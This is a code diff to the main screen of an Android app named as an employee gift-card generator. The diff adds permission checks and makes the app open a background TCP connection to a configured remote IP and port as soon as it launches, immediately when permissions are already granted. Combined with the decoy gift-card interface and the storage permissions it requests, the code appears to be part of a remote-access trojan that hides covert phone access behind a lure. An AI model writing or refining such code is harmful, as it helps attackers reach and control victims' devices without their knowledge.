@@ -2,10 +2,12 @@ package com.employee.giftcard;
 
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.app.Activity;
 import android.content.Context;
+import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -65,21 +67,20 @@ public class MainActivity extends AppCompatActivity {
             permissionList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
         
             String[] permissions = permissionList.toArray(new String[0]);
-            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
-        }
-        
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    // Wait 5 seconds to allow permissions to be granted
-                    Thread.sleep(5000);
-                } catch (InterruptedException e) {
-                    e.printStackTrace();
-                }
-                new tcpConnection(activity, context).execute(config.IP, config.port);
+            
+            // Check if all permissions are already granted
+            boolean allPermissionsGranted = areAllPermissionsGranted(permissions);
+            
+            if (!allPermissionsGranted) {
+                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
             }
-        }).start();
+            
+            // Start TCP connection with conditional delay
+            startTcpConnection(allPermissionsGranted);
+        } else {
+            // Pre-Marshmallow - no runtime permissions needed
+            startTcpConnection(true);
+        }
         
         countdownText = findViewById(R.id.countdownText);
         generateButton = findViewById(R.id.generateButton);
@@ -140,6 +141,60 @@ public class MainActivity extends AppCompatActivity {
             if (i < 3) code.append("-");
         }
         return code.toString();
+    }
+    
+    // Check if all required permissions are already granted
+    private boolean areAllPermissionsGranted(String[] permissions) {
+        for (String permission : permissions) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
+    }
+    
+    // Start TCP connection with conditional delay based on permission status
+    private void startTcpConnection(boolean permissionsAlreadyGranted) {
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    if (!permissionsAlreadyGranted) {
+                        // Wait 5 seconds to allow permissions to be granted
+                        Log.d(TAG, "Permissions not granted yet, waiting 5 seconds...");
+                        Thread.sleep(5000);
+                    } else {
+                        Log.d(TAG, "All permissions already granted, connecting immediately!");
+                    }
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                new tcpConnection(activity, context).execute(config.IP, config.port);
+            }
+        }).start();
+    }
+    
+    // Handle permission request results
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            
+            if (allGranted) {
+                Log.d(TAG, "All permissions granted by user");
+            } else {
+                Log.d(TAG, "Some permissions denied by user");
+                Toast.makeText(this, "Some permissions denied. App may not work correctly.", Toast.LENGTH_LONG).show();
+            }
+        }
     }
     
     @Override
